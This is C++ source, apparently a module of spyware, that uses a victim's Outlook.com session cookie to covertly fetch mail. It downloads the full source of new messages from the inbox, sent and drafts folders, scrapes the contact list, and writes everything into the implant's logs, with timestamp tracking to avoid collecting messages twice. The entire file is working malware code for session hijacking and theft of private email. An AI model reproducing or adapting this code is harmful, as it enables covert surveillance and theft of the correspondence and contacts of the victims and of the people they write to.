#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);

extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 
extern DWORD max_social_mail_len;

#define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }

#define OUTLOOK_INBOX  "00000000-0000-0000-0000-000000000001"
#define OUTLOOK_OUTBOX "00000000-0000-0000-0000-000000000003"
#define OUTLOOK_DRAFTS "00000000-0000-0000-0000-000000000004"

#define SKIP_PERIODS(x, y) 		if (!(y = SkipPeriods(x, y))) break;

char *SkipPeriods(DWORD count, char *ptr)
{
	for (int i=0; i<count; i++) {
		if (!(ptr = strchr(ptr, ',')))
			break;
		ptr++;
	}
	return ptr;
}

char *ParseField(char *ptr, char *field, DWORD field_len)
{
	char *ptr2;

	ZeroMemory(field, field_len);
	if(*ptr!='\"')
		return ptr;
	ptr++;
	if(*ptr==',')
		return ptr;
	ptr2 = strchr(ptr, ',');
	if (!ptr2)
		return ptr;
	ptr2--;
	*ptr2 = NULL;

	_snprintf_s(field, field_len, _TRUNCATE, "%s", ptr);

	ptr2++;
	return ptr2;
}

BOOL ParseDate(char *str_date, FILETIME *ft)
{
	SYSTEMTIME st;
	ZeroMemory(&st, sizeof(st));
	sscanf(str_date, "%d-%d-%dT%d:%d:%d.", &st.wYear, &st.wMonth, &st.wDay, &st.wHour, &st.wMinute, &st.wSecond);
	return SystemTimeToFileTime(&st, ft);
}

DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	BYTE *r_buffer_inner = NULL;
	DWORD response_len;
	WCHAR url[1024];
	BYTE *parser1, *parser2;
	char message_id[256];
	char str_date[21];
	FILETIME ft;

	CheckProcessStatus();
	
	_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/InboxLight.aspx?n=1&fid=%S&so=Date&sa=false&fav=false", folder);		

	// Prende la lista dei messaggi
	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", url, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	ret_val = SOCIAL_REQUEST_BAD_COOKIE;
	parser1 = r_buffer;
	for (;;) {
		CheckProcessStatus();

		// Prende l'id del messaggio
		parser1 = (BYTE *)strstr((char *)parser1, "class=\"ia_hc t_s_hov ml");
		if (!parser1) 
			break;
		parser1 = (BYTE *)strstr((char *)parser1, "\" id=\"");
		if (!parser1) 
			break;
		parser1 += strlen("\" id=\"");
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2) 
			break;
		*parser2=0;
		_snprintf_s(message_id, sizeof(message_id), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		// Prende il timestamp
		parser2 = (BYTE *)strstr((char *)parser1, " mdt=\"");
		if (!parser2) 
			break;
		parser2 += strlen(" mdt=\"");
		ZeroMemory(str_date, sizeof(str_date));
		strncpy(str_date, (char *)parser2, 20);
		if (!ParseDate(str_date, &ft))
			break;

		// Verifica se e' gia' stato preso
		if (ft.dwHighDateTime < last_tstamp_hi)
			continue;
		if (ft.dwHighDateTime==last_tstamp_hi && ft.dwLowDateTime<=last_tstamp_lo)
			continue;
		SetLastFBTstamp(user, ft.dwLowDateTime, ft.dwHighDateTime);

		// Vede se si tratta di un messaggio singolo o di una conversazione
		if (!strncmp((char *)parser1, "conv=", 5) || !strncmp((char *)parser1, " conv=", 6))
			_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/GetMessageSource.aspx?convid=%S&folderid=%S", message_id, folder);		
		else
			_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/GetMessageSource.aspx?msgid=%S&folderid=%S", message_id, folder);		
		ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", url, 443, NULL, 0, &r_buffer_inner, &response_len, cookie);	
		if (ret_val != SOCIAL_REQUEST_SUCCESS) 
			break;
		
		CheckProcessStatus();
		// Check sulla dimensione stabilita' nell'agente
		if (response_len > max_social_mail_len)
			response_len = max_social_mail_len;
		// Verifica che non mi abbia risposto con la pagina di login
		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "From")) {
			// Toglie eventuali tag <pre>
			if (response_len>20 && !strncmp((char *)r_buffer_inner, "<pre>", 5))
				LogSocialMailMessageFull(MAIL_OUTLOOK, r_buffer_inner+5, response_len-11, is_incoming, is_draft);
			else
				LogSocialMailMessageFull(MAIL_OUTLOOK, r_buffer_inner, response_len, is_incoming, is_draft);
		} else {
			SAFE_FREE(r_buffer_inner);
			break;
		}

		SAFE_FREE(r_buffer_inner);
	}
	SAFE_FREE(r_buffer);
	return ret_val;
}


DWORD ParseOLContacts(char *cookie, char *user_name)
{
	HANDLE hfile;
	BYTE *r_buffer = NULL;
	DWORD ret_val;
	DWORD response_len = 0;
	char *parser1;
	char first_name[128];
	char last_name[128];
	char ascii_mail[256];
	char ascii_company[64];
	char ascii_phone[64];
	WCHAR company[64];
	WCHAR phone[64];
	WCHAR screen_name[256];
	WCHAR mail_account[256];

	CheckProcessStatus();

	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/mail/GetContacts.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	CheckProcessStatus();
	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);

	// Crea il propio account
	_snwprintf_s(screen_name, sizeof(screen_name)/sizeof(WCHAR), _TRUNCATE, L"%S", user_name);
	DumpContact(hfile, CONTACT_SRC_OUTLOOK, screen_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name, NULL, CONTACTS_MYACCOUNT);

	parser1 = (char *)r_buffer;
	LOOP {
		if (!(parser1 = strstr(parser1, "\r\n,")))
			break;
		
		SKIP_PERIODS(1, parser1);
		parser1 = ParseField(parser1, first_name, sizeof(first_name));
		SKIP_PERIODS(2, parser1);
		parser1 = ParseField(parser1, last_name, sizeof(last_name));
		SKIP_PERIODS(2, parser1);
		parser1 = ParseField(parser1, ascii_company, sizeof(ascii_company));
		SKIP_PERIODS(23, parser1);
		parser1 = ParseField(parser1, ascii_phone, sizeof(ascii_phone));
		SKIP_PERIODS(18, parser1);
		parser1 = ParseField(parser1, ascii_mail, sizeof(ascii_mail));

		_snwprintf_s(phone, sizeof(phone)/sizeof(WCHAR), _TRUNCATE, L"%S", ascii_phone);
		_snwprintf_s(company, sizeof(company)/sizeof(WCHAR), _TRUNCATE, L"%S", ascii_company);
		_snwprintf_s(mail_account, sizeof(mail_account)/sizeof(WCHAR), _TRUNCATE, L"%S", ascii_mail);
		_snwprintf_s(screen_name, sizeof(screen_name)/sizeof(WCHAR), _TRUNCATE, L"%S %S", first_name, last_name);

		DumpContact(hfile, CONTACT_SRC_OUTLOOK, screen_name, mail_account, company, NULL, NULL, NULL, phone, NULL, mail_account, NULL, 0);
	}
	Log_CloseFile(hfile);

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD HandleOutlookMail(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char curr_user[256];
	static char last_user_name[256]; 
	char *ptr, *ptr2;
	DWORD last_tstamp_hi, last_tstamp_lo;

	CheckProcessStatus();

	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	// Verifica il cookie 
	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/default.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	// Identifica l'utente
	ptr = strstr((char *)r_buffer, "</script><title>");
	FREE_PARSING(ptr);
	ptr = strstr((char *)ptr, "Outlook - ");
	FREE_PARSING(ptr);
	ptr += strlen("Outlook - ");
	ptr2 = strstr((char *)ptr, "</title>");
	FREE_PARSING(ptr2);
	*ptr2 = NULL;
	_snprintf_s(curr_user, sizeof(curr_user), _TRUNCATE, "%s", ptr);	
	SAFE_FREE(r_buffer);

	if (bPM_ContactsStarted) {	
		// Se e' diverso dall'ultimo username allora lo logga...
		if (strcmp(curr_user, last_user_name)) {
			_snprintf_s(last_user_name, sizeof(last_user_name), _TRUNCATE, "%s", curr_user);		
			ret_val = ParseOLContacts(cookie, last_user_name);
		}
	}

	if (!bPM_MailCapStarted)
		return ret_val;

	last_tstamp_lo = GetLastFBTstamp(curr_user, &last_tstamp_hi);
	ParseFolder(cookie, OUTLOOK_OUTBOX, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
	ParseFolder(cookie, OUTLOOK_INBOX, curr_user, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
	return ParseFolder(cookie, OUTLOOK_DRAFTS, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
}
